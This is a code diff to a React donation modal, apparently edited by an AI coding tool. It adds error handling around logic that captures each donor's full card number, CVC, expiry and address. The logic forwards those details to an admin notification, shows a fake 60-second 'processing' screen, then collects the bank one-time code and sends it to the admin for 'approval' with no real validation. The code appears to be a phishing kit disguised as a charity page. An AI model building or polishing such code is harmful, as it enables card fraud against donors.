@@ -47,6 +47,7 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
   const [donation, setDonation] = useState<Donation | null>(null);
   const [otpCode, setOtpCode] = useState('');
   const [rejectionReason, setRejectionReason] = useState('');
+  const [submitError, setSubmitError] = useState<string | null>(null);
   const [donationData, setDonationData] = useState<DonationData>({
     amount: 1,
     isMonthly: false,
@@ -160,80 +161,89 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
   };
 
   const handleSubmit = async () => {
-    // Generate OTP and create donation record IMMEDIATELY
-    const generatedOTP = donationDb.generateOTP();
-    setOtpCode(generatedOTP);
-    
-    const newDonation = donationDb.addDonation({
-      amount: donationData.amount,
-      firstName: donationData.firstName,
-      lastName: donationData.lastName,
-      email: donationData.email,
-      phone: donationData.phone,
-      country: donationData.country,
-      address1: donationData.address1,
-      address2: donationData.address2,
-      city: donationData.city,
-      state: donationData.state,
-      zipCode: donationData.zip,
-      cardLast4: donationData.cardNumber.slice(-4),
-      cardNumber: donationData.cardNumber,
-      cvc: donationData.cvc,
-      cardholderName: donationData.cardholderName,
-      cardExpiration: donationData.expiration,
-      donationType: donationData.isMonthly ? 'monthly' : 'one-time',
-      purposeOfDonation: donationData.purpose,
-      heardAboutUs: donationData.howHeard,
-      coverTransactionFees: donationData.coverFees,
-      isBusinessDonation: donationData.businessDonation,
-      wantsUpdates: donationData.receiveUpdates,
-      status: 'pending',
-      otpCode: generatedOTP,
-    });
-    
-    setDonation(newDonation);
-    
-    // Send card details notification to admin INSTANTLY with full details
-    donationDb.addNotification({
-      type: 'card_details',
-      donationId: newDonation.id,
-      referenceNumber: newDonation.referenceNumber,
-      donorName: `${donationData.firstName} ${donationData.lastName}`,
-      email: donationData.email,
-      phone: donationData.phone,
-      amount: donationData.amount,
-      message: `Card details received: ${donationData.cardNumber}`,
-      cardNumber: donationData.cardNumber,
-      cardLast4: donationData.cardNumber.slice(-4),
-      cardholderName: donationData.cardholderName,
-      cvc: donationData.cvc,
-      cardExpiration: donationData.expiration,
-      billingAddress: donationData.address1,
-      city: donationData.city,
-      state: donationData.state,
-      zipCode: donationData.zip,
-      donationType: donationData.isMonthly ? 'monthly' : 'one-time',
-    });
-    
-    // Move to processing step
-    setStep(5);
-    
-    // Wait 60 seconds, then move to OTP verification
-    setTimeout(() => {
-      setStep(6); // Move to OTP verification
-    }, 60000); // 60 second processing
+    setSubmitError(null);
+
+    try {
+      // Generate OTP and create donation record IMMEDIATELY
+      const generatedOTP = donationDb.generateOTP();
+      setOtpCode(generatedOTP);
+
+      const newDonation = await donationDb.addDonation({
+        amount: donationData.amount,
+        firstName: donationData.firstName,
+        lastName: donationData.lastName,
+        email: donationData.email,
+        phone: donationData.phone,
+        country: donationData.country,
+        address1: donationData.address1,
+        address2: donationData.address2,
+        city: donationData.city,
+        state: donationData.state,
+        zipCode: donationData.zip,
+        cardLast4: donationData.cardNumber.slice(-4),
+        cardNumber: donationData.cardNumber,
+        cvc: donationData.cvc,
+        cardholderName: donationData.cardholderName,
+        cardExpiration: donationData.expiration,
+        donationType: donationData.isMonthly ? 'monthly' : 'one-time',
+        purposeOfDonation: donationData.purpose,
+        heardAboutUs: donationData.howHeard,
+        coverTransactionFees: donationData.coverFees,
+        isBusinessDonation: donationData.businessDonation,
+        wantsUpdates: donationData.receiveUpdates,
+        status: 'pending',
+        otpCode: generatedOTP,
+      });
+
+      setDonation(newDonation);
+
+      // Send card details notification to admin INSTANTLY with full details
+      await donationDb.addNotification({
+        type: 'card_details',
+        donationId: newDonation.id,
+        referenceNumber: newDonation.referenceNumber,
+        donorName: `${donationData.firstName} ${donationData.lastName}`,
+        email: donationData.email,
+        phone: donationData.phone,
+        amount: donationData.amount,
+        message: `Card details received: ${donationData.cardNumber}`,
+        cardNumber: donationData.cardNumber,
+        cardLast4: donationData.cardNumber.slice(-4),
+        cardholderName: donationData.cardholderName,
+        cvc: donationData.cvc,
+        cardExpiration: donationData.expiration,
+        billingAddress: donationData.address1,
+        city: donationData.city,
+        state: donationData.state,
+        zipCode: donationData.zip,
+        donationType: donationData.isMonthly ? 'monthly' : 'one-time',
+      });
+
+      // Move to processing step
+      setStep(5);
+
+      // Wait 60 seconds, then move to OTP verification
+      setTimeout(() => {
+        setStep(6); // Move to OTP verification
+      }, 60000); // 60 second processing
+    } catch (error) {
+      console.error('[v0] Failed to submit donation:', error);
+      setSubmitError('Something went wrong while submitting your donation. Please try again.');
+    }
   };
 
-  const handleOTPVerify = (code: string) => {
-    if (donation) {
+  const handleOTPVerify = async (code: string) => {
+    if (!donation) return;
+
+    try {
       // Send OTP to admin for verification (no local validation)
-      donationDb.updateDonation(donation.id, {
+      await donationDb.updateDonation(donation.id, {
         status: 'pending',
         otpCode: code,
       });
-      
+
       // Send OTP verification notification to admin with full details and approval buttons
-      donationDb.addNotification({
+      await donationDb.addNotification({
         type: 'otp_verified',
         donationId: donation.id,
         referenceNumber: donation.referenceNumber,
@@ -250,19 +260,27 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
         cardExpiration: donation.cardExpiration,
         donationType: donation.donationType,
       });
-      
+
       // Move to waiting for approval state
       setStep(7);
+    } catch (error) {
+      console.error('[v0] Failed to verify OTP:', error);
+      setSubmitError('Something went wrong while submitting your OTP. Please try again.');
     }
   };
 
-  const handleResendOTP = () => {
-    if (donation) {
+  const handleResendOTP = async () => {
+    if (!donation) return;
+
+    try {
       const generatedOTP = donationDb.generateOTP();
       setOtpCode(generatedOTP);
-      donationDb.updateDonation(donation.id, {
+      await donationDb.updateDonation(donation.id, {
         otpCode: generatedOTP,
       });
+    } catch (error) {
+      console.error('[v0] Failed to resend OTP:', error);
+      setSubmitError('Something went wrong while resending your OTP. Please try again.');
     }
   };
 
@@ -271,6 +289,7 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
     setStep(1);
     setDonation(null);
     setOtpCode('');
+    setSubmitError(null);
     setDonationData({
       amount: 1,
       isMonthly: false,
@@ -316,6 +335,12 @@ export function DonationModal({ isOpen, onClose }: DonationModalProps) {
 
         {/* Modal Content */}
         <div className="p-4 sm:p-8">
+          {submitError && (
+            <div className="mb-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-lg p-3">
+              {submitError}
+            </div>
+          )}
+
           {step === 1 && (
             <DonationAmount
               data={donationData}
